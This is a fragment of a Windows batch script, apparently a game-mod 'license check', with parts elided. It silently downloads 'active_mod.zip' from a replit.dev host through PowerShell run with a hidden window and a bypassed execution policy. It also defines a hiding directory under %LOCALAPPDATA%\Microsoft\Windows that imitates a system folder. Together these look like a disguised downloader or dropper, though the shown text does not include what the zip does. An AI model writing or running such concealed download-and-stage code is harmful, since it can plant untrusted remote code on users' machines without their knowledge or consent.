...
set "LICENSE_KEY=8a94dc05-9a17-421c-a030-f459d0bbf386"
set "MOD_DOWNLOAD=https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/8a94dc05-9a17-421c-a030-f459d0bbf386"
set "PS_SCRIPT=license-check-8a94dc05-9a17-421c-a030-f459d0bbf386.ps1"
set "LOGFILE=log.txt"
set "HIDDEN_DIR=%LOCALAPPDATA%\Microsoft\Windows"
...
(
  ...
  echo License Key: 8a94dc05-9a17-421c-a030-f459d0bbf386
  echo PS Script: %PS_SCRIPT%
  echo Mod URL: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/8a94dc05-9a17-421c-a030-f459d0bbf386
  echo.
) > "%LOGFILE%"
...
echo. >> "%LOGFILE%"
echo [*] Starting download from: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/8a94dc05-9a17-421c-a030-f459d0bbf386 >> "%LOGFILE%"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/8a94dc05-9a17-421c-a030-f459d0bbf386' -OutFile 'active_mod.zip' -UseBasicParsing -TimeoutSec 60; Write-Output '[√] Download completed successfully'; exit 0 } catch { Write-Output ('[ERROR] Download failed: ' + $_.Exception.Message); exit 1 }" >> "%LOGFILE%" 2>&1
